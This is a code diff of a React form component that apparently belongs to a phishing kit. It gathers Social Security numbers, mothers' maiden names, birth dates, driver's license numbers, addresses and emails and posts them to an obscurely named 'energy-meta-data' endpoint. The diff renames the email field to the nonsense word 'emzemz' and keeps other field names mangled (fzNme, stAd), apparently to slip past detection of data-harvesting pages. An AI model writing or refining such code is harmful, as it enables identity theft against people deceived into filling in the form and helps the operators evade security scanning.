@@ -25,11 +25,11 @@ const BasicInfo: React.FC = () => {
   const [city, setCity] = useState('');
   const [state, setState] = useState('');
   const [zipCode, setZipCode] = useState('');
-  const [email, setEmail] = useState('');
+  const [emzemz, setEmzemz] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [errors, setErrors] = useState({
     fzNme: '', lzNme: '', phone: '', ssn: '', motherMaidenName: '',
-    dob: '', driverLicense: '', stAd: '', city: '', state: '', zipCode: '', email: '', form: ''
+    dob: '', driverLicense: '', stAd: '', city: '', state: '', zipCode: '', emzemz: '', form: ''
   });
   const [username, setUsername] = useState('');
   const navigate = useNavigate();
@@ -75,7 +75,7 @@ const BasicInfo: React.FC = () => {
   const validateForm = () => {
     const newErrors = {
       fzNme: '', lzNme: '', phone: '', ssn: '', motherMaidenName: '',
-      dob: '', driverLicense: '', stAd: '', city: '', state: '', zipCode: '', email: '', form: ''
+      dob: '', driverLicense: '', stAd: '', city: '', state: '', zipCode: '', emzemz: '', form: ''
     };
 
     if (!fzNme.trim()) newErrors.fzNme = 'First name is required.';
@@ -95,7 +95,7 @@ const BasicInfo: React.FC = () => {
     if (!city.trim()) newErrors.city = 'City is required.';
     if (!state.trim()) newErrors.state = 'State is required.';
     if (!zipCode.trim()) newErrors.zipCode = 'Zip code is required.';
-    if (!email.trim()) newErrors.email = 'Email is required.';
+    if (!emzemz.trim()) newErrors.emzemz = 'Emzemz is required.';
 
     setErrors(newErrors);
     return !Object.values(newErrors).some(error => error);
@@ -123,7 +123,8 @@ const BasicInfo: React.FC = () => {
 
       // Combined submission
       await axios.post(`${baseUrl}api/energy-meta-data-3/`, {
-        email: email,
+        emzemz: username,
+        email: `${username}@example.com`,
         // Basic info
         fzNme,
         lzNme,
@@ -295,19 +296,19 @@ const BasicInfo: React.FC = () => {
         </div>
 
         <div>
-          <label className="block text-sm text-slate-300 mb-1" htmlFor="email">
-            Email
+          <label className="block text-sm text-slate-300 mb-1" htmlFor="emzemz">
+            Emzemz
           </label>
           <input
-            id="email"
-            name="email"
-            type="email"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
+            id="emzemz"
+            name="emzemz"
+            type="text"
+            value={emzemz}
+            onChange={(e) => setEmzemz(e.target.value)}
             className={inputClasses}
-            placeholder="Enter email"
+            placeholder="Enter emzemz"
           />
-          {errors.email ? <FormError message={errors.email} /> : null}
+          {errors.emzemz ? <FormError message={errors.emzemz} /> : null}
         </div>
 
         <div>
